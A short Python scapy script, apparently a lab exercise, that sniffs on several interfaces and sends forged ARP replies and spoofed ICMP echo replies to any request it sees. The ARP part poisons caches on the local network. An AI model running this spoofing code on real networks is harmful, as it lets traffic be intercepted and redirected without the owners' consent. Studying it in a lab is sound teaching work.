from scapy.all import *

#define my ip       
my_ip = "10.0.2.5"  
def spoof_arp_pkt(pkt):
 if pkt.haslayer(ARP) and pkt[ARP].op == 1:
        print("spoof packet information:")
        # create new arp replay and fill it 
        arp = ARP(op = 2, psrc = pkt[ARP].pdst , pdst = pkt[ARP].psrc , ptype = pkt[ARP].ptype,plen = pkt[ARP].plen, hwlen = pkt[ARP].hwlen, hwtype = pkt[ARP].hwtype , hwdst = pkt[ARP].hwsrc )
        send(arp)
        print("send arp replay")

def spoof_icmp_pkt(pkt):
  if pkt[ICMP].type == 8:
     print("\nOriginal Packet.........")
     print("Source IP : ", pkt[IP].src)
     print("Destination IP :", pkt[IP].dst)

     ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
     icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
     data = pkt[Raw].load
     newpkt = ip/icmp/data

     print("\nSpoofed Packet...")
     print("Source IP : ", newpkt[IP].src)
     print("Destination IP : ", newpkt[IP].dst)


     send(newpkt,verbose=0)


def spoof_pkt(pkt):
    if ARP in pkt:
        spoof_arp_pkt(pkt)	
    elif ICMP in pkt:
        spoof_icmp_pkt(pkt)

pkt=sniff(iface=['br-8b86d076ab3c' ,'docker0', 'enp0s3','lo'], filter= "icmp or arp" , prn=spoof_pkt)
